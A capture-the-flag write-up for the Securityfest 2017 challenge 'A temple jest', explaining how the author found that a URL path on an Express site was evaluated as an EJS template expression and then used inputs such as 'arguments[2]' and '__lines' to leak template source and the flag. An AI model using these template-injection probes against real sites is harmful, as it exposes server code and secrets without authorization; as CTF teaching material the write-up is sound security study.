---
layout: post
ctf: "Securityfest 2017"
title: "A temple jest"
---

The main challenge was on this page `http://alieni.se:3003/render/404` which showed the website was under construction. When entering random characters, the website answers with "timeout". The next thing we try is a math expression which would lead to believe there was some kind of code execution.

`http://alieni.se:3003/render/4*4` confirmed the hypothesis showing the following output

```
16 is under construction...
```

Since the header mentionned the server was running Express, a Node.js web framework, we proceeded passing JavaScript variables such as `arguments`.

`http://alieni.se:3003/render/arguments[2]` leaked the following source code

```javascript
function (path, includeData) {
        var d = utils.shallowCopy({}, data);
        if (includeData) {
          d = utils.shallowCopy(d, includeData);
        }
        return includeFile(path, opts)(d);
      } is under construction...
```

Searching parts of this code on Google shows that is it part of the EJS library, a templating engine for JavaScript. This means that we are a probably injecting in an EJS template. Looking around the source code of EJS, we stumble upon this part of the template compilation process:

```javascript
if (opts.compileDebug) {
  src = 'var __line = 1' + '\n'
      + '  , __lines = ' + JSON.stringify(this.templateText) + '\n'
      + '  , __filename = ' + (opts.filename ?
            JSON.stringify(opts.filename) : 'undefined') + ';' + '\n'
      + 'try {' + '\n'
      + this.source
      + '} catch (e) {' + '\n'
      + '  rethrow(e, __lines, __filename, __line, escapeFn);' + '\n'
      + '}' + '\n';
}
```

If the `compileDebug` flag is enabled when compiling the template, EJS will add some variables to throw exception with better context to ease the debugging of the template. The variables `__lines` contains the template source code so let's check it out.

http://alieni.se:3003/render/__lines indeed outputs the template source code and the flag.

```
&lt;%= __lines %&gt; is under construction...&lt;%# ---SCTF{m3m0ry_l34k_Schm3m0ry_l34k}---SCTF{m3m0ry_l34k_Schm3m0ry_l34k}---SCTF{m3m0ry_l34k_Schm3m0ry_l34k}---SCTF{m3m0ry_l34k_Schm3m0ry_l34k}---SCTF{m3m0ry_l34k_Schm3m0ry_l34k}---SCTF{m3m0ry_l34k_Schm3m0ry_l34k}---SCTF{m3m0ry_l34k_Schm3m0ry_l34k}---SCTF{m3m0ry_l34k_Schm3m0ry_l34k}---SCTF{m3m0ry_l34k_Schm3m0ry_l34k}---SCTF{m3m0ry_l34k_Schm3m0ry_l34k}---SCTF{m3m0ry_l34k_Schm3m0ry_l34k}---SCTF{m3m0ry_l34k_Schm3m0ry_l34k}---SCTF{m3m0ry_l34k_Schm3m0ry_l34k}---SCTF{m3m0ry_l34k_Schm3m0ry_l34k}---SCTF{m3m0ry_l34k_Schm3m0ry_l34k}---SCTF{m3m0ry_l34k_Schm3m0ry_l34k}---SCTF{m3m0ry_l34k_Schm3m0ry_l34k}---SCTF{m3m0ry_l34k_Schm3m0ry_l34k}---SCTF{m3m0ry_l34k_Schm3m0ry_l34k}---SCTF{m3m0ry_l34k_Schm3m0ry_l34k} %&gt; is under construction...
```

Looking at the flag itself and other writeups, this was probably not the intended solution since no memory leaks was used.

Becojo - Northern Coalition
